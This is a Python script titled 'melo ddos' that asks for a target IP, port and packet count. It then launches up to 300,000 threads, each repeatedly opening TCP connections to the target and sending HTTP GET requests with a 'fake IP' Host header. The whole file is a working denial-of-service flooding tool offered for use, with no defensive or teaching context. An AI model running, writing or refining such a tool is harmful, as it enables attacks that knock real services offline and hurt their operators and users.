from pystyle import Colors, Colorate
from pystyle import System
from pystyle import Cursor

import socket
import os
import threading
import time

System.Init()
System.Title("melo ddos")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()

def title():
    print(Colorate.Color(Colors.red,
    f"""
                _             _     _           
 _ __ ___   ___| | ___     __| | __| | ___  ___ 
| '_ ` _ \ / _ \ |/ _ \   / _` |/ _` |/ _ \/ __|
| | | | | |  __/ | (_) | | (_| | (_| | (_) \__ `
|_| |_| |_|\___|_|\___/   \__,_|\__,_|\___/|___/                   
    """))




while True:
    clear_screen()
    text = "    by melounware"
    print(Colorate.Color(Colors.pink, text, True))

    text1 = "       1.0"
    print(Colorate.Color(Colors.pink, text1, True))

    try:
        target = input(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Target Ip: "))
        if not target:
            raise ValueError(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Target cannot be empty!"))
            time.sleep(3)
        
        print(" ")
        fake_ip = input(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Fake IP: "))
        if not fake_ip:
            raise ValueError(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Fake IP cannot be empty!"))
            time.sleep(3)
        
        print(" ")
        port = int(input(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Port: ")))
        print(" ")
        num_of_packets = int(input(Colorate.Horizontal(Colors.purple_to_red, " [melo ddos] Number Of Packets: ")))
        
        if num_of_packets > 300000:
            num_of_packets = 300000
            print(" ")
            print(Colorate.Horizontal(Colors.red_to_yellow, " [melo ddos] Maximum number of packets exceeded. Sending 300,000 packets."))
            time.sleep(3)
            
        attack_num = 0
        last_attack_time = time.time()
        stop_event = threading.Event()

        def attack():
            global attack_num, last_attack_time
            while not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendall(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
                    s.sendall(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
                    
                    attack_num += 1
                    last_attack_time = time.time()
                    s.close()
                except Exception as e:
                    print(" ")
                    print(Colorate.Horizontal(Colors.red_to_yellow, f" [melo ddos] Failed to send packet!"))
                    if time.time() - last_attack_time > 5:
                        break

        threads = []
        for i in range(num_of_packets):
            thread = threading.Thread(target=attack)
            thread.start()
            threads.append(thread)
            print(" ")
            print(Colorate.Horizontal(Colors.purple_to_red, f" [melo ddos] Packet {i+1} Sent Succesfully!."))

        time.sleep(5)
        stop_event.set()

        for thread in threads:
            thread.join()
        print(" ")
        print(Colorate.Horizontal(Colors.green_to_cyan, " [melo ddos] All Packets Requested Have Been Sent!"))
        time.sleep(2)
    except ValueError as ve:
        print(" ")
        print(Colorate.Horizontal(Colors.red_to_yellow, f" [melo ddos] Error: {ve}"))
        time.sleep(3)
    except KeyboardInterrupt:
        print(" ")
        print(Colorate.Horizontal(Colors.red_to_yellow, "\n [melo ddos] Keyboard Interrupt detected. Exiting..."))
        time.sleep(3)
        break
